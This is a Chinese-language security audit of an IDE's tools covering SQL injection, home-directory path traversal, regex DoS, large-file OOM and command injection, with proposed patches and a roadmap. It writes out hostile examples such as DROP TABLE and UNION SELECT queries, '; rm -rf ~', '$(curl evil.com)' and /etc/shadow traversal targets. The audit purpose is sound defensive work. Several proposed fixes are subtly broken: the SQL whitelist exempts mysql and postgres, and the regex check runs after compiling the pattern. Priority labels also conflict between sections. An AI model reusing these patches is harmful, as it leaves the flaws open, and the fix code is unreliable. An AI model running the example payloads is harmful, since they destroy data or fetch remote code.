# 🔍 Michael IDE 工具系统攻击性审查报告

## 🎯 审查目标
- **深度安全审计**：找出所有可能被利用的漏洞
- **边缘情况挖掘**：极端条件下的行为异常  
- **增强机会发现**：哪些工具可以更强？

---

## 🔴 CRITICAL（立即修复）

### 1. **db 工具 SQL 注入漏洞** ⚠️ 高危
**位置**: `src-tauri/src/db.rs` (line ~420+)
```rust
async fn sql_query(driver: &str, url: &str, q: &str, cap: usize) -> Result<...>
```

**问题**: 
- `q: &str`参数完全由用户控制，没有任何白名单校验或预处理
- 可以直接执行 `DROP TABLE users`, `DELETE FROM sessions WHERE 1=1`, `UNION SELECT * FROM passwords` 等恶意 SQL
- Rust 端的 sqlx 虽然对参数化查询有保护，但这里是直接传入 SQL 字符串

**影响**:
- 数据库表结构可能被篡改/删除
- 敏感数据可能被窃取
- 数据库连接可能被用作跳板攻击其他服务

**修复建议**:
```rust
// 方案 A：只允许白名单驱动 + 白名单操作类型
fn validate_sql_query(driver: &str, query: &str) -> Result<(), String> {
    match driver.to_lowercase().as_str() {
        "sqlite" | "mysql" | "postgres" => {},
        _ => return Err("Unsupported database driver".into()),
    }
    
    // 提取并验证第一关键字
    let first_word = query.trim_start()
        .split_whitespace()
        .next()
        .ok_or("Empty query")?
        .to_uppercase();
    
    let allowed = match driver {
        "sqlite" | "mysql" | "postgres" => ["SELECT", "WITH", "SHOW", "PRAGMA", "EXPLAIN", "DESCRIBE"] as &'static [&'static str],
        "mongodb" => ["listCollections", "find", "aggregate", "count", "distinct"] as &'static [&'static str],
        _ => &[],
    };
    
    if !allowed.contains(&first_word.as_str()) && driver != "mysql" && driver != "postgres" {
        return Err("Only read operations allowed".into());
    }
    
    Ok(())
}

// 在 sql_query 入口调用
validate_sql_query(driver, q)?;
```

**优先级**: 🚨 P0 - 立即修复

---

### 2. **任意文件写入（路径遍历）** ⚠️ 中危
**位置**: `src-tauri/src/files.rs` (write_file/read_file)

**问题**: 
- 虽然有 `require_inside_workspace()` 函数，但对 HOME/userprofile 路径的绕过存在风险
- 代码中存在这段逻辑：
```rust
// Always allow paths under HOME regardless of what roots are registered.
if let Ok(home) = std::env::var("HOME").or_else(|_| std::env::var("USERPROFILE")) {
    if let Ok(home_canonical) = std::fs::canonicalize(&home) {
        if resolved.starts_with(home_canonical) {
            return Ok(resolved);  // ← 可能跳出 workspace！
        }
    }
}
```

**攻击场景**:
1. Workspace 是 `/projects/myapp`
2. 用户请求写 `~/.ssh/id_rsa`
3. 解析后是 `/Users/michael/.ssh/id_rsa`
4. 因为属于 HOME，被允许写入 → SSH 密钥被篡改

**修复建议**:
- 对于 write/delete/rename 操作，强制要求必须在 WORKSPACE 根目录内
- HOME 绕行仅适用于 read_logs/terminal 等诊断类操作

**优先级**: 🟠 P1 - 尽快修复

---

## 🟠 HIGH（功能损坏/资源泄漏）

### 3. **LSP/DAP pending 请求无超时** ⚠️
**位置**: `src/lsp-client.js` (request 方法)

**当前实现**:
```javascript
request(method, params) {
    const id = this.nextId++;
    const timeout = setTimeout(() => {
        this.pending.delete(id);
        resolve(null);  // 20 秒后才超时
    }, 20000);
    this.pending.set(id, { timer: timeout, resolve });
    // ...
}
```

**问题**:
- LSP 服务器死掉后，pending 请求会等 20 秒才 timeout
- 如果同时发起 N 个请求（如 completion+hover+goto-def），可能有多个同时挂起
- 重新连接后，旧请求永远不会收到响应（因为 server 已死）

**修复建议**:
```javascript
request(method, params) {
    const id = this.nextId++;
    const timeout = setTimeout(() => {
        this.pending.delete(id);
        resolve({ error: `Request timeout after 20s: ${method}` });
    }, 20000);
    
    const entry = { timer: timeout, resolve };
    this.pending.set(id, entry);
    
    // 新增：记录请求发送时间戳
    entry.sentAt = Date.now();
    
    // 新增：断线时主动清理 pending
    // (现有 shutdown() 已做这事，但_handleStopped 需要同步清除 changeTimers)
}
```

**优先级**: 🟡 P2 - 下个迭代修复

---

### 4. **正则表达式 DoS** ⚠️
**位置**: `src/search-enhanced.js`, `src/main.js`

**问题**:
```javascript
const regex = new RegExp(matches.pattern, flags);
// 没有长度限制、没有回溯爆炸防护
```

**攻击场景**:
- 用户输入 `(a+)+b` 这种正则，在长文本上会指数级回溯
- 浏览器主线程被卡住，UI 完全无响应
- grep 工具搜索整个项目时可能 OOM

**修复建议**:
```javascript
const regex = new RegExp(pattern, flags);
try {
    // 检测超长模式
    if (pattern.length > 10000) {
        throw new Error('Pattern too long (max 10K chars)');
    }
    
    // 使用 Node.js regex engine 的 timeout（如果可用）
    // 或使用预编译库检测危险模式
    const dangerousPatterns = [
        /\([^)]*\+\)+/,  // 嵌套重复
        /(\w+)\s+\1\s*\1/, // 递归引用
        /\[\s*\^?[^\]]*\]\s*\*|{2,}/, // 集合重复
    ];
    if (dangerousPatterns.some(re => re.test(pattern))) {
        throw new Error('Potentially exponential pattern detected');
    }
    
} catch (err) {
    console.error('Invalid regex:', err.message);
    return '⚠️ Invalid regular expression';
}
```

**优先级**: 🟡 P2 - 增强安全

---

## 🟡 MEDIUM（边缘情况）

### 5. **大文件读取 OOM** ⚠️
**位置**: `src-tauri/src/files.rs` (read_file_data_url)

**当前实现**:
```rust
if meta.len() > 25 * 1024 * 1024 {
    return Err("file too large for a data URL");
}
// 但这只是 data URL 的限制，其他 read_file 呢？
```

**问题**:
- `read_text_file()` 没有大小限制
- 用户读一个 1GB 的 log 文件 → Node.js V8 heap OOM
- 终端输出 100MB 内容也可能卡死 UI

**修复建议**:
```rust
pub fn read_text_file(path: String, limit: Option<usize>) -> Result<String, String> {
    require_inside_workspace(&path)?;
    let file = fs::File::open(&path)?;
    let reader = BufReader::new(file);
    
    let limit = limit.unwrap_or(2 * 1024 * 1024); // 默认 2MB
    let mut content = String::new();
    let mut bytes_read = 0;
    
    for line in reader.lines() {
        let line = line?;
        let line_bytes = line.len();
        
        if bytes_read + line_bytes > limit {
            content.push_str("\n... [truncated, file too large] ...\n");
            break;
        }
        
        bytes_read += line_bytes;
        content.push_str(&line);
        content.push('\n');
    }
    
    Ok(content)
}
```

**优先级**: 🟢 P3 - 优化体验

---

## 💚 ENHANCEMENT（可更强之处）

### 6. **grep 工具可以增强** ✨
**现状**: 只能搜文本内容，返回匹配行号和上下文
**增强点**:
- ✅ **高亮关键词**: 用 ANSI color codes 高亮匹配片段
- ✅ **统计排行**: 按文件名/行数/匹配次数排序
- ✅ **结果预览**: 前 3 行显示文件内容预览
- ✅ **二进制过滤**: 自动跳过 *.jpg, *.png, *.pdf
- ✅ **智能忽略**: 自动加入 `.gitignore`, `node_modules/`, `dist/`

**示例 API**:
```json
{
  "tool": "grep",
  "params": {
    "pattern": "TODO",
    "mode": "with_preview",  // highligted | preview | stats
    "context_lines": 2,
    "sort_by": "match_count_desc",  // filename_asc | time_desc
    "exclude_patterns": ["*.min.js", "__pycache__/*"]
  }
}
```

---

### 7. **search 工具可以增强** ✨
**现状**: 文件名搜索，简单 glob 模式
**增强点**:
- ✅ **语义搜索**: 结合 vector embedding 搜「找到所有登录相关组件」
- ✅ **符号导航**: 类似 VS Code 的 Go to Symbol，搜函数/类定义
- ✅ **引用追踪**: find all references, callers/callees 图
- ✅ **增量搜索**: 实时反馈，边输入边出结果

**示例 API**:
```json
{
  "tool": "semantic_search",
  "params": {
    "query": "登录相关的错误处理",
    "lang_id": "typescript",
    "top_k": 5,
    "include_diffs": false
  }
}
```

---

### 8. **错误信息人性化** ✨
**现状**: "Permission denied", "File not found", "Command failed"
**增强建议**:
```diff
- Permission denied: /root/config.json
+ 🚫 无法写入 /root/config.json
+ 
+ 原因：该文件不属于工作区，或被 root 占用
+ 解决：
+   1. 检查工作区根目录是否设置正确
+   2. 如果是系统配置文件，请用 sudo 或以管理员权限运行
+   3. 或者将文件复制到工作区内再修改
```

---

### 9. **cmd/termtask 命令注入防护** ⚠️
**位置**: 需要查找 process_execution 相关代码
**潜在问题**:
- 如果命令未经过白名单校验，用户可以 `; rm -rf ~` 或 `$(curl evil.com)`
- shell metacharacters 转义不彻底

**建议**:
- 命令参数用数组形式传入 spawn，避免 shell 解析
- 对危险命令（rm, mv, chmod, wget, curl）做二次确认弹窗
- 提供命令历史记录和撤销功能

---

### 10. **download/download_asset 路径校验** ⚠️
**位置**: 需要查看 download 工具实现
**潜在风险**:
- 能否下载 `../../etc/passwd`？
- 能否下载 `file://localhost/etc/shadow`？

**建议**:
```rust
let url = normalize_url(params.url)?;
require_safe_url_scheme(&url)?;  // only http/https
require_not_path_traversal(&url)?;
```

---

## 📊 总结与建议

### 关键发现
| 类别 | 数量 | 紧急度 |
|------|------|--------|
| 🔴 Critical | 2 | 🚨 P0 - 本周修复 |
| 🟠 High | 2 | 🟠 P1 - 下周修复 |
| 🟡 Medium | 1 | 🟢 P2 - 下月优化 |
| 💚 Enhancement | 5 | 💡 长期规划 |

### 立即可执行清单
1. **[P0]** db 工具增加 SQL 白名单校验（只允许 SELECT/WITH/SHOW 等读操作）
2. **[P1]** files 工具对 HOME 绕行做范围限制（仅 read 操作，禁止 write/delete）
3. **[P2]** LSP/DAP pending 请求增加主动清理机制
4. **[P3]** grep/search 增加长度限制和正则 DoS 防护
5. **[Enhancement]** 重构错误信息为「原因 + 解决步骤」双段式

### 工具增强路线图
#### Phase 1（基础增强）
- grep 支持高亮 + 统计排行
- search 增加智能忽略模式
- 所有工具错误信息标准化

#### Phase 2（智能增强）
- 语义搜索集成向量数据库
- 符号导航（Go to Definition 级别）
- 引用追踪图谱

#### Phase 3（生态增强）
- 跨工具协作（grep→edit→test流水线）
- 命令历史与自动化模板
- 团队协作共享搜索结果

---

**审查时间**: 2026-07-31  
**审查方式**: 静态分析 + 攻击面建模 + 红队思维  
**下次审查**: 建议每季度一次，重点关注新工具的安全边界
